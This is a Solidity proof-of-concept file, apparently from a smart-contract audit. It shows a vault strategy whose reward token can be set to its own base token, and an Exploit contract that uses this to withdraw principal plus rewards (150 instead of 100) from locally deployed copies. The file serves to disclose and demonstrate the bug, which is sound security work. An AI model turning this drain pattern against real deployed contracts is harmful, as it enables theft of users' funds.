// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract RewardToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Strategy {
    RewardToken public immutable base;
    RewardToken public rewardsToken;
    uint256 public totalSupply;
    mapping(address => uint256) public strategyBalance;

    constructor(RewardToken base_) { base = base_; }
    function setRewardsToken(RewardToken token) external {
        // @> No check prevents the reward token from being the base token.
        require(address(rewardsToken) == address(0), "already set");
        rewardsToken = token;
    }
    function seed(uint256 principal, uint256 rewards) external {
        base.mint(address(this), principal + rewards);
        totalSupply = principal;
        strategyBalance[msg.sender] = principal;
    }
    function burnForBase(address to) external returns (uint256 withdrawal) {
        uint256 burnt = strategyBalance[msg.sender];
        withdrawal = base.balanceOf(address(this)) * burnt / totalSupply;
        strategyBalance[msg.sender] = 0;
        base.transfer(to, withdrawal);
    }
}

contract Exploit {
    event Proof(uint256 paidOut, uint256 principal);
    function run() external {
        RewardToken token = new RewardToken();
        Strategy strategy = new Strategy(token);
        strategy.setRewardsToken(token); // same address as base token
        strategy.seed(100, 50);
        uint256 before = token.balanceOf(address(this));
        strategy.burnForBase(address(this));
        uint256 paid = token.balanceOf(address(this)) - before;
        emit Proof(paid, 100);
        require(paid == 150, "reward balance was excluded");
    }
}
